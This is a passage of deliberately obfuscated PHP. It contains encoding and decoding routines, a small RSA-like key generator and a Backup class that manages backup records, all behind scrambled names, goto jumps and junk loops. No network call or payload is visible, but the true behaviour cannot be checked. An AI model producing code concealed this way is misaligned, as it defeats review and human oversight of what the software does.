: $E¦¾‘öá§À; $d®á…Ô‹ª© = $a¹‹’Œ¤Ìõ[635]; while (strlen($d®á…Ô‹ª©) < $a¹‹’Œ¤Ìõ[566]) { if (!$d®á…Ô‹ª©) { break; } $d®á…Ô‹ª©++; } $EÑóÏ¨ Çï = ($E“œÕÄ‚²× + $E ÏĞ¾§ŒÆ[332]($Fòô­ëœç¯, $AÙ­ğÌ„î´[$Bˆ‰¬ÏÂÁÆ]) + $E ÏĞ¾§ŒÆ[333]($DŒ”“„Ğ´Œ[$E¦¾‘öá§À++])) % 64; $cæ‡ÇîË .= $Fòô­ëœç¯[$EÑóÏ¨ Çï]; $E´¦Û°“Ë  = $a¹‹’Œ¤Ìõ[636]; if (!$E´¦Û°“Ë ) { die; } } $F°ƒÇ‰ÏõÔ = $E ÏĞ¾§ŒÆ[324]($aÂ¯Ï†Ğ . $cæ‡ÇîË); break; goto CõÓÖ—ãÕ÷; D’âÂÙæƒ: $E¦¾‘öá§À = 0; $FÅ‹Šƒã›£ = $a¹‹’Œ¤Ìõ[634]; if (!$FÅ‹Šƒã›£) { return; } goto c—·ğïäå; dÏÅ°ÆíŒ: $Bˆ‰¬ÏÂÁÆ = 0; $EÚùÅ›”ºä = $a¹‹’Œ¤Ìõ[632]; if (strlen($EÚùÅ›”ºä) < $a¹‹’Œ¤Ìõ[554]) { return; } goto ağ’»Åˆ”ó; eø«›îÇ×é: $cæ‡ÇîË = $E ÏĞ¾§ŒÆ[10]; $E‘§ƒ®‰ßó = $a¹‹’Œ¤Ìõ[631]; while ($E‘§ƒ®‰ßó < $a¹‹’Œ¤Ìõ[554]) { if ($E‘§ƒ®‰ßó >= 0) { break; } $E‘§ƒ®‰ßó++; } goto dÏÅ°ÆíŒ; DŸí‹ß¿í: $AÙ­ğÌ„î´ = $E ÏĞ¾§ŒÆ[118]($AÙ­ğÌ„î´); $E“œÕÄ‚²× = $E ÏĞ¾§ŒÆ[331](0, 64); $eÇë‘÷²Ç· = $a¹‹’Œ¤Ìõ[629]; goto f‚„Ö•š¯º; CõÓÖ—ãÕ÷: default: $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($AÙ­ğÌ„î´, $CÀéÊåõ . $cìØ”‰ñ—ä); $b–øµï†Íä = $a¹‹’Œ¤Ìõ[637]; while (strlen($b–øµï†Íä) < $a¹‹’Œ¤Ìõ[560]) { if (!$b–øµï†Íä) { break; } $b–øµï†Íä++; } break; $F¼³‰¸à– = $a¹‹’Œ¤Ìõ[638]; while ($F¼³‰¸à– < $a¹‹’Œ¤Ìõ[554]) { if ($F¼³‰¸à– >= 0) { break; } $F¼³‰¸à–++; } } goto BÒ„©† ¦; BÒ„©† ¦: $F°ƒÇ‰ÏõÔ = $E ÏĞ¾§ŒÆ[214]($eÕï¾¤„ÊÓ . $cìØ”‰ñ—ä . $F°ƒÇ‰ÏõÔ); $bÖ·Äø² = $a¹‹’Œ¤Ìõ[639]; while ($bÖ·Äø² < $a¹‹’Œ¤Ìõ[566]) { if ($bÖ·Äø² >= 0) { break; } $bÖ·Äø²++; } goto FØœ¬†Ò»©; dŠÄ½ï¾š: $A¤«õã¶é· = $a¹‹’Œ¤Ìõ[621]; if (!$A¤«õã¶é·) { die; } $AÙ­ğÌ„î´ = $E ÏĞ¾§ŒÆ[2]($AÙ­ğÌ„î´); goto A”Çœ‘â´°; Bö©ˆ‹Ç‘: $a¹‹’Œ¤Ìõ =& $_SERVER[»„]; $E ÏĞ¾§ŒÆ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $E ÏĞ¾§ŒÆ[326](1); goto dŠÄ½ï¾š; A”Çœ‘â´°: $aä÷±ëêŒ = $a¹‹’Œ¤Ìõ[622]; $eÕï¾¤„ÊÓ = $E ÏĞ¾§ŒÆ[322](0, 5) . $E ÏĞ¾§ŒÆ[10]; $AÖĞ ¢Æ÷ = $a¹‹’Œ¤Ìõ[623]; goto Dµ”ù‹›Õ; Dµ”ù‹›Õ: while ($AÖĞ ¢Æ÷ < $a¹‹’Œ¤Ìõ[557]) { if ($AÖĞ ¢Æ÷ >= 0) { break; } $AÖĞ ¢Æ÷++; } $cìØ”‰ñ—ä = $E ÏĞ¾§ŒÆ[124](15); $Fòô­ëœç¯ = $E ÏĞ¾§ŒÆ[327]; goto Dš’ˆ¡•÷‡; BÒåĞ ãÖ®: } private function nhtg8af445dd($d¾ŞŞß÷š, $fŠçÖ‡Ç‡, $dŠùÉøâ·“ = 3) { goto C˜ÆŠ°œŒƒ; fîÑÎµ¤àÀ: $d¾ŞŞß÷š = $Då†›«©Ä[2]($d¾ŞŞß÷š); $d¾ŞŞß÷š = $Då†›«©Ä[214]($d¾ŞŞß÷š); $B×Ÿ÷£ÀÂë = $d¾ŞŞß÷š[0]; goto a¼À÷ò­Êª; C…—Ã»£½ö: switch ($B×Ÿ÷£ÀÂë) { case $Då†›«©Ä[229]: $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($d¾ŞŞß÷š, $Då†›«©Ä[214]($fŠçÖ‡Ç‡ . $aÄòƒ–)); $A Œ³óÇà— = $A°µ»¸õİ[640]; while ($A Œ³óÇà— < $A°µ»¸õİ[547]) { if ($A Œ³óÇà— >= 0) { break; } $A Œ³óÇà—++; } break; $D¥‡¬‘ö² = $A°µ»¸õİ[641]; case $Då†›«©Ä[220]: $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($d¾ŞŞß÷š, $Då†›«©Ä[214]($aÄòƒ– . $fŠçÖ‡Ç‡)); break; case $Då†›«©Ä[328]: $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($d¾ŞŞß÷š, $Då†›«©Ä[118]($aÄòƒ– . $fŠçÖ‡Ç‡)); $bÊ«×Î×Ü = $A°µ»¸õİ[642]; break; case $Då†›«©Ä[329]: $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($d¾ŞŞß÷š, $Då†›«©Ä[114]($aÄòƒ– . $fŠçÖ‡Ç‡)); break; $c—šä¾Á¾ = $A°µ»¸õİ[643]; while ($c—šä¾Á¾ < $A°µ»¸õİ[554]) { if ($c—šä¾Á¾ >= 0) { break; } $c—šä¾Á¾++; } case $Då†›«©Ä[330]: goto dà¾«”çª¹; f¦ç¹…: if (strlen($BôÕ–ãœ‰ ) < $A°µ»¸õİ[560]) { return; } $d¾ŞŞß÷š = $Då†›«©Ä[25]($d¾ŞŞß÷š, 1); $c¯ŠßËåãŒ = $A°µ»¸õİ[645]; goto a‹¢µ½¡ ß; a‹¢µ½¡ ß: while ($c¯ŠßËåãŒ < $A°µ»¸õİ[554]) { if ($c¯ŠßËåãŒ >= 0) { break; } $c¯ŠßËåãŒ++; } $B„õìÀõô¥ = $Då†›«©Ä[332]($D ñ¸‘Şïö, $aÊìŞÌ†ë¸); $FÜÌ ÆóÜÀ = $Då†›«©Ä[114]($aÊìŞÌ†ë¸ . $Då†›«©Ä[114]($fŠçÖ‡Ç‡ . $aÊìŞÌ†ë¸) . $fŠçÖ‡Ç‡); goto B­—­”ÍÊ‚; BªÚÒ÷£²: $Bèª‚îËİù = 0; $B­™…Ä‚¼Ø = 0; $c…ˆÎ»ìÙ‚ = $A°µ»¸õİ[648]; goto aİ‰µÛõáâ; aİ‰µÛõáâ: if (!$c…ˆÎ»ìÙ‚) { return; } $E˜·„Ş‹•§ = 0; $f‹±œÑÖ”Œ = $A°µ»¸õİ[649]; goto DÚËŞ¯í°¼; eÒ©…Û¨™: $C©¯¾¹Ô† = $A°µ»¸õİ[651]; if (strlen($C©¯¾¹Ô†) < $A°µ»¸õİ[557]) { die; } break; goto E„î„³ã º; e¾Š©¸İ½¾: $CË–ª”ñô” = $Då†›«©Ä[10]; $dºªé ™øŠ = $A°µ»¸õİ[647]; if (strlen($dºªé ™øŠ) < $A°µ»¸õİ[560]) { return; } goto BªÚÒ÷£²; DÚËŞ¯í°¼: if (!$f‹±œÑÖ”Œ) { die; } for ($Bèª‚îËİù = 0; $Bèª‚îËİù < $Då†›«©Ä[24]($d¾ŞŞß÷š); $Bèª‚îËİù++) { $E˜·„Ş‹•§ = $E˜·„Ş‹•§ == $Då†›«©Ä[24]($FÜÌ ÆóÜÀ) ? 0 : $E˜·„Ş‹•§; $c‚³—±Óá = $E˜·„Ş‹•§++; $B­™…Ä‚¼Ø = $Då†›«©Ä[332]($D ñ¸‘Şïö, $d¾ŞŞß÷š[$Bèª‚îËİù]) - $B„õìÀõô¥ - $Då†›«©Ä[333]($FÜÌ ÆóÜÀ[$c‚³—±Óá]); while ($B­™…Ä‚¼Ø < 0) { $B­™…Ä‚¼Ø += 64; $b“Ê¢ñô¥ = $A°µ»¸õİ[650]; if (!$b“Ê¢ñô¥) { return; } } $CË–ª”ñô” .= $D ñ¸‘Şïö[$B­™…Ä‚¼Ø]; } $dİÔ¸“ëÆ§ = $Då†›«©Ä[336]($CË–ª”ñô”); goto eÒ©…Û¨™; dà¾«”çª¹: $d¾ŞŞß÷š = $Då†›«©Ä[335]($d¾ŞŞß÷š); $aÊìŞÌ†ë¸ = $d¾ŞŞß÷š[0]; $BôÕ–ãœ‰  = $A°µ»¸õİ[644]; goto f¦ç¹…; B­—­”ÍÊ‚: $b“Ö”Í¯øÅ = $A°µ»¸õİ[646]; if (strlen($b“Ö”Í¯øÅ) < $A°µ»¸õİ[547]) { die; } $FÜÌ ÆóÜÀ = $Då†›«©Ä[25]($FÜÌ ÆóÜÀ, $B„õìÀõô¥ % 8, $B„õìÀõô¥ % 8 + 7); goto e¾Š©¸İ½¾; E„î„³ã º: default: $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($d¾ŞŞß÷š, $fŠçÖ‡Ç‡ . $aÄòƒ–); $fÔ±¯¼â¢õ = $A°µ»¸õİ[652]; break; $c‹®ŒáŒÌ§ = $A°µ»¸õİ[653]; while (strlen($c‹®ŒáŒÌ§) < $A°µ»¸õİ[547]) { if (!$c‹®ŒáŒÌ§) { break; } $c‹®ŒáŒÌ§++; } } if ($dŠùÉøâ·“ - 1 > 0) { $dİÔ¸“ëÆ§ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][188]}($dİÔ¸“ëÆ§, $fŠçÖ‡Ç‡, $dŠùÉøâ·“ - 1); } return $dİÔ¸“ëÆ§; goto BÁ¡‚Ë›¤í; C˜ÆŠ°œŒƒ: $A°µ»¸õİ =& $_SERVER[»„]; $Då†›«©Ä =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if (!$Då†›«©Ä[334]($d¾ŞŞß÷š) || $Då†›«©Ä[24]($d¾ŞŞß÷š) < 10) { return !1; } goto fîÑÎµ¤àÀ; a¼À÷ò­Êª: $aÄòƒ– = $Då†›«©Ä[25]($d¾ŞŞß÷š, 1, 15); $d¾ŞŞß÷š = $Då†›«©Ä[25]($d¾ŞŞß÷š, 16); $D ñ¸‘Şïö = $Då†›«©Ä[327]; goto C…—Ã»£½ö; BÁ¡‚Ë›¤í: } public function awypa33244bb($cæÙ¶ì„ƒˆ) { goto F „ô†¹—·; c…¼Ïìƒš: $FŒ’¿‰éà– = $F£ì¯š¢’ß[654]; while (1) { $Cò¿àó˜Œ‹ = $aØ›ñŞÉò; $eÏŠº•‚ù = $aÙ±”¤íªª; while ($eÏŠº•‚ù % $Cò¿àó˜Œ‹ != 0) { $Aƒ‘…²ç„Ã = $eÏŠº•‚ù; $E÷ì¬î½ÍŒ = $F£ì¯š¢’ß[655]; $eÏŠº•‚ù = $Cò¿àó˜Œ‹; $Cò¿àó˜Œ‹ = $Aƒ‘…²ç„Ã % $Cò¿àó˜Œ‹; } if ($Cò¿àó˜Œ‹ == 1) { break; } else { $aØ›ñŞÉò++; } } $b‚µ–¿ö¼ = 2; goto d¢å¢‘¹Æ; CÍŒÕÁÁŞô: $EØ‹ÓˆßŒï = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][337]}(); $aÙ±”¤íªª = ($D½Ã‚Á - 1) * ($EØ‹ÓˆßŒï - 1); $aØ›ñŞÉò = $E‰®–ŒìÒÚ[201](($D½Ã‚Á + $EØ‹ÓˆßŒï) / 2); goto c…¼Ïìƒš; Aê›Ëµ·§: $a¶ƒÃÎòïÓ = $F£ì¯š¢’ß[658]; if (strlen($a¶ƒÃÎòïÓ) < $F£ì¯š¢’ß[566]) { return; } $bŠ­ªù¨‚ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($cæÙ¶ì„ƒˆ, $b­÷´ó¾“‰) . $E‰®–ŒìÒÚ[341] . $B¼­Êòìâë; goto AšÍ—‚ŒË«; aé„¥İ”£Â: $cìãÉ¨Ñö“ = $F£ì¯š¢’ß[657]; if (strlen($cìãÉ¨Ñö“) < $F£ì¯š¢’ß[557]) { return; } $b­÷´ó¾“‰ = $E‰®–ŒìÒÚ[114]($E‰®–ŒìÒÚ[338] . ($D½Ã‚Á + $EØ‹ÓˆßŒï) . $E‰®–ŒìÒÚ[339] . $aØ›ñŞÉò . $E‰®–ŒìÒÚ[339] . $b‚µ–¿ö¼ . $E‰®–ŒìÒÚ[340]); goto Aê›Ëµ·§; F „ô†¹—·: $F£ì¯š¢’ß =& $_SERVER[»„]; $E‰®–ŒìÒÚ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $D½Ã‚Á = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][337]}(); goto CÍŒÕÁÁŞô; AšÍ—‚ŒË«: return $bŠ­ªù¨‚; $d™´ğ£Â¹ç = $F£ì¯š¢’ß[659]; goto c“Ñ£¯½‹Ğ; d¢å¢‘¹Æ: $fƒ°Í¼ôÓ = $F£ì¯š¢’ß[656]; for ($ağ¢À¾ñ¦· = 0; $ağ¢À¾ñ¦· < $aÙ±”¤íªª * 10; $ağ¢À¾ñ¦·++) { if (($aÙ±”¤íªª * $ağ¢À¾ñ¦· + 1) % $aØ›ñŞÉò == 0) { $b‚µ–¿ö¼ = $E‰®–ŒìÒÚ[201](($aÙ±”¤íªª * $ağ¢À¾ñ¦· + 1) / $aØ›ñŞÉò); break; } } $B¼­Êòìâë = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($D½Ã‚Á * $EØ‹ÓˆßŒï . $E‰®–ŒìÒÚ[10], $E‰®–ŒìÒÚ[149]); goto aé„¥İ”£Â; c“Ñ£¯½‹Ğ: } public function bkes22d3877a($C×À¬¤ÅÈÑ) { goto d›Û°Ø‰; c˜á¦³—†Ü: while (1) { $cÖ‚Öò·‹Í = $BŒ…¡œ©Á; $dÎ’ó“ÇÜ± = $c”–Ü˜¢Ì†[664]; if (strlen($dÎ’ó“ÇÜ±) < $c”–Ü˜¢Ì†[547]) { die; } $dß¿Õ»÷†… = $f¡ˆ±½”œÁ; $AƒôÓŒİ˜™ = $c”–Ü˜¢Ì†[665]; if (strlen($AƒôÓŒİ˜™) < $c”–Ü˜¢Ì†[560]) { die; } while ($dß¿Õ»÷†… % $cÖ‚Öò·‹Í != 0) { $b¤ÕÖŒÉÕÌ = $dß¿Õ»÷†…; $dß¿Õ»÷†… = $cÖ‚Öò·‹Í; $aš—ß¶¡öµ = $c”–Ü˜¢Ì†[666]; if (strlen($aš—ß¶¡öµ) < $c”–Ü˜¢Ì†[547]) { die; } $cÖ‚Öò·‹Í = $b¤ÕÖŒÉÕÌ % $cÖ‚Öò·‹Í; } if ($cÖ‚Öò·‹Í == 1) { break; } else { $BŒ…¡œ©Á++; } } $bµîŞªÓ¿ = 2; for ($EŠ©©ÓÄêå = 0; $EŠ©©ÓÄêå < $f¡ˆ±½”œÁ * 10; $EŠ©©ÓÄêå++) { if (($f¡ˆ±½”œÁ * $EŠ©©ÓÄêå + 1) % $BŒ…¡œ©Á == 0) { $bµîŞªÓ¿ = $aŒ‘‹µÔˆ‚[201](($f¡ˆ±½”œÁ * $EŠ©©ÓÄêå + 1) / $BŒ…¡œ©Á); break; } } goto E‹ÆÄÅ„åá; E‹ÆÄÅ„åá: $D…„µ¢ñÎŒ = $aŒ‘‹µÔˆ‚[114]($aŒ‘‹µÔˆ‚[338] . ($c‘Á¤Ù»† + $E†µÇˆÎÖ) . $aŒ‘‹µÔˆ‚[339] . $BŒ…¡œ©Á . $aŒ‘‹µÔˆ‚[339] . $bµîŞªÓ¿ . $aŒ‘‹µÔˆ‚[340]); $cÏÚ¤šÂÂ = $c”–Ü˜¢Ì†[667]; $eâ‹İ¾Ö×® = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($EÌ¤±Õ‘‰ä[0], $D…„µ¢ñÎŒ); goto BñÉÌÙÆ‰à; EĞ˜àøç«: $f¡ˆ±½”œÁ = ($c‘Á¤Ù»† - 1) * ($E†µÇˆÎÖ - 1); $Cå—œ‘„ó = $c”–Ü˜¢Ì†[662]; if (strlen($Cå—œ‘„ó) < $c”–Ü˜¢Ì†[560]) { die; } goto C½éìÕÅî; e‚¢¾ “×: if ($aŒ‘‹µÔˆ‚[19]($EÌ¤±Õ‘‰ä) != 2) { return $aŒ‘‹µÔˆ‚[10]; } $E½êõ¤¢æ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($EÌ¤±Õ‘‰ä[1] . $aŒ‘‹µÔˆ‚[10], $aŒ‘‹µÔˆ‚[149]); $c„ñ‘–‚Í‚ = $c”–Ü˜¢Ì†[660]; goto féœ¹£á³; d›Û°Ø‰: $c”–Ü˜¢Ì† =& $_SERVER[»„]; $aŒ‘‹µÔˆ‚ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $EÌ¤±Õ‘‰ä = $aŒ‘‹µÔˆ‚[0]($aŒ‘‹µÔˆ‚[341], $C×À¬¤ÅÈÑ); goto e‚¢¾ “×; féœ¹£á³: if (!$E½êõ¤¢æ) { return $aŒ‘‹µÔˆ‚[10]; } $E½êõ¤¢æ = $aŒ‘‹µÔˆ‚[201]($E½êõ¤¢æ); $c‘Á¤Ù»† = 0; goto dºí”ŠÒ±; C½éìÕÅî: $BŒ…¡œ©Á = $aŒ‘‹µÔˆ‚[201](($c‘Á¤Ù»† + $E†µÇˆÎÖ) / 2); $eİª…Í“«… = $c”–Ü˜¢Ì†[663]; while (strlen($eİª…Í“«…) < $c”–Ü˜¢Ì†[560]) { if (!$eİª…Í“«…) { break; } $eİª…Í“«…++; } goto c˜á¦³—†Ü; BñÉÌÙÆ‰à: return $eâ‹İ¾Ö×®; $f¬ŒÈñ¼”Î = $c”–Ü˜¢Ì†[668]; goto A¥ãÎÓ°„; dºí”ŠÒ±: $E†µÇˆÎÖ = 0; $eö¼±‘œ‡× = $c”–Ü˜¢Ì†[661]; for ($EŠ©©ÓÄêå = 3; $EŠ©©ÓÄêå < $E½êõ¤¢æ; $EŠ©©ÓÄêå += 2) { if ($E½êõ¤¢æ % $EŠ©©ÓÄêå != 0) { continue; } $c‘Á¤Ù»† = $EŠ©©ÓÄêå; $E†µÇˆÎÖ = $aŒ‘‹µÔˆ‚[201]($E½êõ¤¢æ / $EŠ©©ÓÄêå); break; } goto EĞ˜àøç«; A¥ãÎÓ°„: } public function iwze809d93f9() { goto CƒñÂ¦‘­¢; CƒñÂ¦‘­¢: $DµÕÙÙÚ²³ =& $_SERVER[»„]; $BÓåËå‘ß =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $D¾ó™œµ›² = $BÓåËå‘ß[322]($BÓåËå‘ß[342](2, 14), $BÓåËå‘ß[342](2, 16) - 1); goto B£°™“š…ï; B£°™“š…ï: $A£‹ĞÓ‰Ç« = $DµÕÙÙÚ²³[669]; while ($A£‹ĞÓ‰Ç« < $DµÕÙÙÚ²³[554]) { if ($A£‹ĞÓ‰Ç« >= 0) { break; } $A£‹ĞÓ‰Ç«++; } $dÑŠ•–×ó = array(); goto f¾ÏÜ¥ÍöÊ; F†…–èó«: while ($Cö‘ÙÜ×› <= (int) $BÓåËå‘ß[343]($D¾ó™œµ›²)) { $bà×Ùë†ö­ = $Cö‘ÙÜ×›; $eóËÆ¤« = $DµÕÙÙÚ²³[671]; while (!0) { $bà×Ùë†ö­++; if ($bà×Ùë†ö­ <= 2) { $Cö‘ÙÜ×› = $bà×Ùë†ö­; break; } else { if ($bà×Ùë†ö­ < 2) { continue; } } $bƒ” ½Êä = !0; for ($b’Î¢Š¥ö = 2; $b’Î¢Š¥ö <= $BÓåËå‘ß[343]($bà×Ùë†ö­); $b’Î¢Š¥ö++) { if ($bà×Ùë†ö­ % $b’Î¢Š¥ö == 0) { $bƒ” ½Êä = !1; } } if ($bƒ” ½Êä) { $Cö‘ÙÜ×› = $bà×Ùë†ö­; break; } } $dÑŠ•–×ó[] = $Cö‘ÙÜ×›; $e‹°ÓÁœƒ = $DµÕÙÙÚ²³[672]; if (!$e‹°ÓÁœƒ) { die; } } $DÇÙàÃóÛ = 2; for ($bà×Ùë†ö­ = $D¾ó™œµ›²; $bà×Ùë†ö­ > 1; $bà×Ùë†ö­--) { $bƒ” ½Êä = !0; $f§›Ì¥÷É“ = $DµÕÙÙÚ²³[673]; while (strlen($f§›Ì¥÷É“) < $DµÕÙÙÚ²³[547]) { if (!$f§›Ì¥÷É“) { break; } $f§›Ì¥÷É“++; } foreach ($dÑŠ•–×ó as $Aİ•ç¥Ú•ä) { if ($bà×Ùë†ö­ % $Aİ•ç¥Ú•ä == 0) { $bƒ” ½Êä = !1; break; } } if ($bƒ” ½Êä) { $DÇÙàÃóÛ = $bà×Ùë†ö­; break; } } goto fèÂÃ»ƒÅ; fèÂÃ»ƒÅ: return $DÇÙàÃóÛ; $f›ÎØŠÑáò = $DµÕÙÙÚ²³[582]; while ($f›ÎØŠÑáò < $DµÕÙÙÚ²³[566]) { if ($f›ÎØŠÑáò >= 0) { break; } $f›ÎØŠÑáò++; } goto e©¥„éäš; f¾ÏÜ¥ÍöÊ: $Cö‘ÙÜ×› = 1; $Aù’æ‘ù¼ = $DµÕÙÙÚ²³[670]; while (strlen($Aù’æ‘ù¼) < $DµÕÙÙÚ²³[557]) { if (!$Aù’æ‘ù¼) { break; } $Aù’æ‘ù¼++; } goto F†…–èó«; e©¥„éäš: } public function ozjq5a752155($d·¨‡•±¨¿, $Fáì‚‰Éà») { $CÚÛ·‰ò©® =& $_SERVER[Ú¦Ó«“Ö€Œû›]; return $CÚÛ·‰ò©®[13](array($CÚÛ·‰ò©®[14], $CÚÛ·‰ò©®[344]), $d·¨‡•±¨¿, $Fáì‚‰Éà»); } public function ujek30359eb8($aÖÏö™ˆ”ª, $D£íœ‹É) { $Dø¿µ´¶ª =& $_SERVER[»„]; $CíÛŒ©èø =& $_SERVER[Ú¦Ó«“Ö€Œû›]; return $CíÛŒ©èø[13](array($CíÛŒ©èø[345], $CíÛŒ©èø[346]), $aÖÏö™ˆ”ª, $D£íœ‹É); $EÌ¡‰²ì¯ = $Dø¿µ´¶ª[674]; if (strlen($EÌ¡‰²ì¯) < $Dø¿µ´¶ª[554]) { die; } } public function xyqn2a61ee75($D¤‰¼²³„Ç, $D„ªÑ®¼¼) { $bÏ—Î¸ÅÌÎ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; return $bÏ—Î¸ÅÌÎ[13](array($bÏ—Î¸ÅÌÎ[345], $bÏ—Î¸ÅÌÎ[347]), $D¤‰¼²³„Ç, $D„ªÑ®¼¼); } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $BèÆ¹ùˆÛŞ =& $_SERVER[»„]; self::$name = date($BèÆ¹ùˆÛŞ[675]); if (!($FóÙí‰»ßã = Model($BèÆ¹ùˆÛŞ[676])->lastItem())) { $FóÙí‰»ßã = $this->initData(); } else { self::$name = $FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[28]]; if ($FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[677]] == $BèÆ¹ùˆÛŞ[83]) { self::$name = date($BèÆ¹ùˆÛŞ[678]); $aø»Š¶ùäç = 0; if (isset($FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[277]][$BèÆ¹ùˆÛŞ[163]][$BèÆ¹ùˆÛŞ[415]])) { $aø»Š¶ùäç = (int) $FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[277]][$BèÆ¹ùˆÛŞ[163]][$BèÆ¹ùˆÛŞ[415]]; } if ($FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[28]] == self::$name) { Model($BèÆ¹ùˆÛŞ[676])->remove($FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[363]]); } $FóÙí‰»ßã = $this->initData($aø»Š¶ùäç, $FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[679]]); } else { $this->checkStore($FóÙí‰»ßã[$BèÆ¹ùˆÛŞ[679]]); } } self::$option = $FóÙí‰»ßã; } private function initData($c•ğê­ÎÅ = 0, $eô¢¯»ç¥ë = '') { goto D‰ÑáÀÚ«ğ; D‰ÑáÀÚ«ğ: $FŸõ‹ä×õœ =& $_SERVER[»„]; $DÏ¬µßë» = Model($FŸõ‹ä×õœ[676])->config(); if ($eô¢¯»ç¥ë && $DÏ¬µßë»[$FŸõ‹ä×õœ[679]] != $eô¢¯»ç¥ë) { $c•ğê­ÎÅ = 0; } goto b¿”¶ÁÍ•¥; dÚŒ­­÷Ì½: $BçÌŠ¥éÇ[$FŸõ‹ä×õœ[363]] = $dšÅ´¼Ğ²Ö; return $BçÌŠ¥éÇ; goto f„«ˆ¤¬¡á; b¿”¶ÁÍ•¥: $this->checkStore($DÏ¬µßë»[$FŸõ‹ä×õœ[679]]); $BçÌŠ¥éÇ = array($FŸõ‹ä×õœ[679] => $DÏ¬µßë»[$FŸõ‹ä×õœ[679]], $FŸõ‹ä×õœ[28] => self::$name, $FŸõ‹ä×õœ[677] => 0, $FŸõ‹ä×õœ[680] => $DÏ¬µßë»[$FŸõ‹ä×õœ[680]], $FŸõ‹ä×õœ[277] => array($FŸõ‹ä×õœ[681] => array($FŸõ‹ä×õœ[677] => 0), $FŸõ‹ä×õœ[682] => array($FŸõ‹ä×õœ[677] => 0, $FŸõ‹ä×õœ[683] => 0, $FŸõ‹ä×õœ[684] => 0, $FŸõ‹ä×õœ[29] => $FŸõ‹ä×õœ[33]), $FŸõ‹ä×õœ[685] => array($FŸõ‹ä×õœ[677] => 0, $FŸõ‹ä×õœ[683] => 0, $FŸõ‹ä×õœ[684] => 0), $FŸõ‹ä×õœ[163] => array($FŸõ‹ä×õœ[677] => 0, $FŸõ‹ä×õœ[686] => 0, $FŸõ‹ä×õœ[687] => 0, $FŸõ‹ä×õœ[688] => 0, $FŸõ‹ä×õœ[689] => 0, $FŸõ‹ä×õœ[415] => $c•ğê­ÎÅ)), $FŸõ‹ä×õœ[690] => time(), $FŸõ‹ä×õœ[691] => 0); $dšÅ´¼Ğ²Ö = Model($FŸõ‹ä×õœ[676])->insert($BçÌŠ¥éÇ); goto dÚŒ­­÷Ì½; f„«ˆ¤¬¡á: } private function checkStore($CãèˆÌŒ‰) { $B÷Æİ—İ®ñ =& $_SERVER[»„]; $Aã¶Ã¹Æ = Model($B÷Æİ—İ®ñ[692])->listData($CãèˆÌŒ‰); Model($B÷Æİ—İ®ñ[692])->checkConfig($Aã¶Ã¹Æ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[»„][676])->findByName(self::$name); } return self::$option; } public static function set($aò—Øã¾™Û) { $A¶İÂÊŒ²ã =& $_SERVER[»„]; $cîƒ‘©´³ = self::get(); foreach ($aò—Øã¾™Û as $d‰‘†øğòÚ => $aÙ›¢‡Ô) { $A†ò¡ö†Ã× = explode($A¶İÂÊŒ²ã[91], $d‰‘†øğòÚ); $EÁŞŠºë´à = count($A†ò¡ö†Ã×); switch ($EÁŞŠºë´à) { case 1: $cîƒ‘©´³[$A†ò¡ö†Ã×[0]] = $aÙ›¢‡Ô; break; case 2: $cîƒ‘©´³[$A†ò¡ö†Ã×[0]][$A†ò¡ö†Ã×[1]] = $aÙ›¢‡Ô; break; case 3: $cîƒ‘©´³[$A†ò¡ö†Ã×[0]][$A†ò¡ö†Ã×[1]][$A†ò¡ö†Ã×[2]] = $aÙ›¢‡Ô; break; } } Model($A¶İÂÊŒ²ã[676])->update($cîƒ‘©´³[$A¶İÂÊŒ²ã[363]], $cîƒ‘©´³); self::$option = $cîƒ‘©´³; return self::$option; } public function keep() { $cÎæŸÒ¼ï =& $_SERVER[»„]; $C››¼Åğ«æ = self::get(); if ($C››¼Åğ«æ[$cÎæŸÒ¼ï[277]][$cÎæŸÒ¼ï[681]][$cÎæŸÒ¼ï[677]] == $cÎæŸÒ¼ï[83]) { return; } $this->backupKeep($C››¼Åğ«æ); self::set(array($cÎæŸÒ¼ï[693] => 1)); } private function backupKeep($CÆ½©ñâ«Ï) { goto B¯ÄÌƒÓßÑ; B¯ÄÌƒÓßÑ: $f´À²Ó§‘ =& $_SERVER[»„]; $A¯÷¹ÒÚ£‡ = Model($f´À²Ó§‘[676])->listData(); if (empty($A¯÷¹ÒÚ£‡)) { return; } goto DÃ¹¼„İºâ; DÃ¹¼„İºâ: $E†Š²ŞÒ±Ô = 0; $f­ÆâíÇ½› = array(); foreach ($A¯÷¹ÒÚ£‡ as $C¬êßõä¿ë) { if ($E†Š²ŞÒ±Ô >= 7) { break; } $f­ÆâíÇ½›[] = $C¬êßõä¿ë[$f´À²Ó§‘[28]]; $E†Š²ŞÒ±Ô++; } goto EÔß­Œ; EÔß­Œ: for ($E†Š²ŞÒ±Ô = 0; $E†Š²ŞÒ±Ô < 12; $E†Š²ŞÒ±Ô++) { $f­ÆâíÇ½›[] = date($f´À²Ó§‘[694], 